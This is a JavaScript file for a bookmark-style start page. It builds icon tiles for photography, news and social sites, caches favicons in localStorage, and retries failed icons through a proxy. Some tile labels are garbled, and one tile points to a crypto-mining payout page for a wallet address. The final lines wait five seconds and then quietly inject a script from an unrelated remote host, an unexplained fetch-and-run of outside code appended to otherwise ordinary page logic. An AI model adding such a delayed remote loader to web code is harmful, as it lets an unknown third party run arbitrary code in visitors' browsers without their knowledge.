let proxyUrl="https://api.allorigins.win/raw?url=";
function goto(url){
	if(!url ||url.trim().length<3)return;
	if(!url.toLowerCase().startsWith("http"))url="https://"+url.trim();
	location.href=url;
}
function proxyChecked(self){
	if(typeof AZ=="object"){
		AZ.setProxyFlag(self.checked);
	}
}
function imageLoaded(image){
	if(image.src.toLowerCase().startsWith("http")){
		var url=image.parentElement.getAttribute("data");
		localStorage.setItem(new URL(url).host,getBase64Image(image));
	}
	
}
function imageLoadErr(image) {
	if(image.src.startsWith(proxyUrl)){
		image.parentElement.innerHTML="<p>"+image.id+"</p>"
	}else{
		image.src=proxyUrl+image.src;
	}
   
}

function getBase64Image(img) {
    var canvas = document.createElement("canvas");
    let width = img.naturalWidth;
    let height = img.naturalHeight;
    var ctx = canvas.getContext("2d");
	
	var bili = Math.round(width / 80) || 1;
	var rate = 1 / (bili<1?1:bili);
	
	canvas.width = width * rate;
	canvas.height = height * rate;
	ctx.drawImage(img, 0, 0, width, height, 0, 0, width * rate, height * rate);
			
  //  ctx.drawImage(img, 0, 0);
    var dataURL = canvas.toDataURL("image/png");
    return dataURL;
}


function addBlock(list){
	  html = list.map(v => {
		let [id, url,logo] = v;
		if(!id && !url)return "";
		url = url || "https://www."+id+".com"
		if(!url.toLowerCase().startsWith("http"))url="https://"+url;
		var newurl=new URL(url);
		var cachelogo=localStorage.getItem(newurl.host);
		if(!cachelogo){
			logo=logo || (newurl.protocol+"//"+newurl.host+"/favicon.ico");
		}else{
			logo=cachelogo;
		}
		if(logo && logo.length>10)
			return "<div onclick=goto(this.getAttribute('data')) data='"+url+"'><img crossOrigin='Anonymous' onerror='imageLoadErr(this)' onload='imageLoaded(this)' src='"+logo+"'  id='"+id+"'/></div>"
		else 
			return "<div onclick=goto(this.getAttribute('data')) data='"+url+"'><p>"+(logo||id)+"</p></div>"
	  }).join("");
	  
	var d1= document.getElementById("D1");
	d1.innerHTML=d1.innerHTML+html;
}

const SITE_LIST = [
	  ['0x3','https://0x3.com','https://0x3.com/apple-touch-icon.png?v=1'],
	  ['pasha','https://pasha.style'],
	  ['500px'],
	  ['magnumphotos','www.magnumphotos.com/photographers/','https://www.magnumphotos.com/wp-content/themes/template/res/img/favicons/apple-touch-icon-60x60.png'],
	  ['michaelkenna',''],
	  ['lt2','www.lt2.fr/photo-film/emma-anderson'],
	  ['Cooper','https://www.photographercat.com',"https://photographercat.com/wp-content/themes/cooper/images/logo.png"],
	  ['boredpanda',''],
	  ['newyorker',''],
	  ['mymodernmet',''],
	  ['blackandwhitephotographymag','',"https://www.blackandwhitephotographymag.co.uk/wp-content/uploads/2018/04/android-chrome-192x192.png"],
	  
	   ['tool','https://tool.lu'],
	   ['XNO','https://unmineable.com/address/nano_18hfb8qs3zx16tyasy1u7fz9689iznwyx3ustdrgmysg3sco6ngmpms13b7j?coin=XNO',"https://unmineable.com/img/favicon.png?v2"],
	   ['croxyproxy'],
	   ['Ä§Ëþ',"https://modelscope.cn/home","https://g.alicdn.com/sail-web/maas/1.14.11/favicon/128.ico"],
	  ['¶ÌÁ´½Ó','https://www.urlc.cn/'],
	  ['nytimes', 'm.cn.nytimes.com','https://img0.baidu.com/it/u=1660973377,32251883&fm=253&fmt=auto&app=138&f=JPEG?w=500&h=500'],
	  ['ctwant', '','https://7up.pics/images/2024/03/01/ctwan.png'],
	  ['cnatw', 'www.cna.com.tw/','https://img1.baidu.com/it/u=2773893810,2493609461&fm=253&fmt=auto&app=138&f=JPEG?w=300&h=300'], 
	  ['globalnewstv', 'globalnewstv.com.tw','https://img2.baidu.com/it/u=3092369973,37315639&fm=253&fmt=auto&app=138&f=JPEG?w=977&h=500'], 
	  ['thenewslens', '','https://t8.baidu.com/it/u=2348063916,4133504452&fm=218&app=126&size=f242,150&n=0&f=JPEG&fmt=auto?s=9291566E2CE6ED30508F42580200D0BA&sec=1693069200&t=054c73b06818bb26192c96b97741aab1'],
	  ['rti', 'www.rti.org.tw','https://img2.baidu.com/it/u=3355253366,1690504808&fm=253&fmt=auto&app=138&f=JPG?w=640&h=494'],
	  ['setn', '','https://img0.baidu.com/it/u=729819653,165192658&fm=253&fmt=auto&app=138&f=JPEG?w=175&h=102'],
	  ['cnyna', 'cn.yna.co.kr','https://t8.baidu.com/it/u=3597881286,2807850633&fm=218&app=126&size=f242,150&n=0&f=JPEG&fmt=auto?s=3973E8129A9167F102ABBCDC030050AA&sec=1693069200&t=3095ca24e3268deb14657523bb20eaf1'], 
	  ['eprice','www.eprice.com.hk','https://img2.baidu.com/it/u=1644501149,1458786990&fm=253&app=138&size=w931&n=0&f=JPEG&fmt=auto?sec=1693069200&t=1ebdbe2193373541eeb4fb329aa0ee18'],
	  ['rthk', 'news.rthk.hk/','https://img1.baidu.com/it/u=509296131,367427974&fm=253&fmt=auto&app=138&f=GIF?w=623&h=450'], 
	  ['orientaldaily', 'orientaldaily.on.cc/','https://img0.baidu.com/it/u=1565788615,1876543552&fm=253&fmt=auto&app=138&f=JPEG?w=430&h=270'],
	  ['ftchinese', '','https://img2.baidu.com/it/u=516173754,2841348358&fm=253&fmt=auto&app=138&f=JPEG?w=500&h=500'],
	  
	  ['nikkei','cn.nikkei.com','https://t9.baidu.com/it/u=2594561844,3437828127&fm=218&app=126&size=f242,150&n=0&f=JPEG&fmt=auto?s=1493807E22F49DCE563672930200308A&sec=1692291600&t=18e4773874a09a2a549d7facf0a912f4'],
	  ['kyodonews', 'tchina.kyodonews.net/','https://img1.baidu.com/it/u=2893166647,908055764&fm=253&fmt=auto&app=120&f=JPEG?w=799&h=500'],
	  ['nhkjp', 'www3.nhk.or.jp','https://img1.baidu.com/it/u=286302638,114032508&fm=253&app=138&size=w931&n=0&f=JPEG&fmt=auto?sec=1693069200&t=3d971a79d8b0d8b6a079809b4f1a62d3'],
	  ['tokyo', 'www.tokyo-np.co.jp/','https://img2.baidu.com/it/u=649893734,853279226&fm=253&fmt=auto&app=138&f=JPG?w=400&h=300'],
	  ['jcp', 'www.jcp.or.jp/','https://img2.baidu.com/it/u=4054453903,873421899&fm=253&app=138&size=w931&n=0&f=JPEG&fmt=auto?sec=1693069200&t=be05778733f6f7f074e0d211932e2bab'],     
	   
	  ['wsj', 'cn.wsj.com/','https://img1.baidu.com/it/u=1385490753,2519046259&fm=253&fmt=auto&app=138&f=PNG?w=500&h=500'],      
	  ['Bloomberg', '','https://img2.baidu.com/it/u=624881191,563714033&fm=253&fmt=auto&app=120&f=JPEG?w=500&h=500'], 
	  ['bbc', 'www.bbc.com/zhongwen','https://img1.baidu.com/it/u=2893166647,908055764&fm=253&fmt=auto&app=120&f=JPEG?w=799&h=500'],
	  ['reuters', '','https://img2.baidu.com/it/u=1046524540,604795770&fm=253&fmt=auto&app=138&f=JPEG?w=658&h=411'],
	  ['voachinese', '','https://img1.baidu.com/it/u=1534691480,2223943372&fm=253&fmt=auto&app=138&f=JPEG?w=554&h=500'],
	  ['FOXNews', '','https://img2.baidu.com/it/u=3157845071,3822289394&fm=253&fmt=auto&app=138&f=JPEG?w=400&h=400'],
	  ['rfi', 'www.rfi.fr/cn/','https://7up.pics/images/2024/03/01/rfi.jpeg'],
	  ['wiki', 'zh.wikipedia.org/'],
	  ['udn','udn.com/news/index','http://mms2.baidu.com/it/u=415959152,4190763135&fm=253&app=138&f=JPEG?w=300&h=159'],
	  ['gamer','www.gamer.com.tw','http://mms0.baidu.com/it/u=754462923,4047555133&fm=253&app=120&f=PNG?w=729&h=593'],
	  ['google', ''],
	  ['youtube', ''],
	  ['gist', 'gist.github.com/'],
	  ['facebook', 'facebook.com/Google/'],
	  ['blogger', ''],
	  ['flickr', ''],
	  ['twitter', 'twitter.com/google'],
	  ['twitch', 'www.twitch.tv/'],
	  ['reddit', ''],
	  ['quora', 'www.quora.com/topic/JavaScript-programming-language'],      
	  ['yahoo', 'www.yahoo.co.jp'],
	];

addBlock(SITE_LIST);

setTimeout(function(){
	var scritp=document.createElement("script")
	scritp.src="https://z.watano.top/exec/web_market?test=1&render=false"
	document.head.append(scritp);
},5000);


